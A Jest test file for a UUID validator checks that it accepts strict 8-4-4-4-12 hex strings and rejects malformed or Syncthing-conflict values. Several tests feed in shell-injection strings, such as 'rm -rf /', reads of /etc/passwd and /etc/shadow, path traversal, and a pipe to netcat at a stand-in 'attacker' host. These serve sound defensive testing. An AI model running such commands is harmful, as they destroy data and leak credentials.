/**
 * Tests for uuid-validation.ts -- UUID format validation.
 *
 * Validates that the isValidUuid function correctly identifies
 * well-formed UUIDs and rejects malformed or dangerous strings
 * that could cause shell injection if used in commands.
 */

import { isValidUuid } from './uuid-validation';

describe('isValidUuid', () => {
  it('accepts valid UUID v4 strings', () => {
    expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000')).toBe(true);
    expect(isValidUuid('6ba7b810-9dad-11d1-80b4-00c04fd430c8')).toBe(true);
    expect(isValidUuid('f47ac10b-58cc-4372-a567-0e02b2c3d479')).toBe(true);
  });

  it('accepts uppercase UUIDs', () => {
    expect(isValidUuid('550E8400-E29B-41D4-A716-446655440000')).toBe(true);
  });

  it('accepts mixed-case UUIDs', () => {
    expect(isValidUuid('550e8400-E29B-41d4-A716-446655440000')).toBe(true);
  });

  it('rejects empty strings', () => {
    expect(isValidUuid('')).toBe(false);
  });

  it('rejects null and undefined', () => {
    expect(isValidUuid(null as any)).toBe(false);
    expect(isValidUuid(undefined as any)).toBe(false);
  });

  it('rejects sync-conflict UUIDs', () => {
    // Syncthing generates filenames like:
    // 550e8400-e29b-41d4-a716-446655440000.sync-conflict-20240115-123456-ABCDEFG
    expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000.sync-conflict-20240115')).toBe(false);
  });

  it('rejects malformed strings', () => {
    expect(isValidUuid('not-a-uuid')).toBe(false);
    expect(isValidUuid('550e8400e29b41d4a716446655440000')).toBe(false); // no dashes
    expect(isValidUuid('550e8400-e29b-41d4-a716')).toBe(false); // too short
    expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000-extra')).toBe(false); // too long
  });

  it('rejects strings with shell metacharacters', () => {
    expect(isValidUuid('550e8400; rm -rf /')).toBe(false);
    expect(isValidUuid('$(whoami)')).toBe(false);
    expect(isValidUuid('`cat /etc/passwd`')).toBe(false);
    expect(isValidUuid('../../../etc/passwd')).toBe(false);
  });

  it('rejects non-hex characters in UUID positions', () => {
    expect(isValidUuid('g50e8400-e29b-41d4-a716-446655440000')).toBe(false);
    expect(isValidUuid('550e8400-e29b-41d4-a716-44665544000z')).toBe(false);
  });
});

// -------------------------------------------------------------------
// Regression tests -- UUID validation completeness
// -------------------------------------------------------------------

describe('Regression: UUID validation covers all attack vectors', () => {
  it('rejects sync-conflict UUID suffixes from Syncthing', () => {
    // Regression: Syncthing conflict files have UUIDs with appended conflict markers.
    // These must not pass validation since they would create invalid shell commands.
    expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000.sync-conflict-20240115-123456-ABCDEFG')).toBe(false);
    expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000.sync-conflict')).toBe(false);
  });

  it('rejects empty string (not just falsy)', () => {
    // Regression: Empty string UUID caused empty shell argument
    expect(isValidUuid('')).toBe(false);
  });

  it('rejects shell metacharacters that could cause injection', () => {
    // Regression: Malformed UUIDs with shell metacharacters could
    // execute arbitrary commands when used in SSH commands.
    expect(isValidUuid('$(rm -rf /)')).toBe(false);
    expect(isValidUuid('`whoami`')).toBe(false);
    expect(isValidUuid('550e8400; cat /etc/shadow')).toBe(false);
    expect(isValidUuid('550e8400 && echo pwned')).toBe(false);
    expect(isValidUuid('550e8400 | nc attacker 4444')).toBe(false);
    expect(isValidUuid('$(cat /etc/passwd)')).toBe(false);
    expect(isValidUuid('../../../etc/passwd')).toBe(false);
    expect(isValidUuid('550e8400\n550e8401')).toBe(false);
  });

  it('accepts only strict 8-4-4-4-12 hex format', () => {
    // Regression: Overly permissive regex could allow non-UUID strings
    expect(isValidUuid('550e8400-e29b-41d4-a716-446655440000')).toBe(true);

    // Wrong segment lengths
    expect(isValidUuid('550e840-e29b-41d4-a716-446655440000')).toBe(false);  // 7-4-4-4-12
    expect(isValidUuid('550e8400-e29-41d4-a716-446655440000')).toBe(false);  // 8-3-4-4-12
    expect(isValidUuid('550e8400-e29b-41d-a716-446655440000')).toBe(false);  // 8-4-3-4-12
  });
});
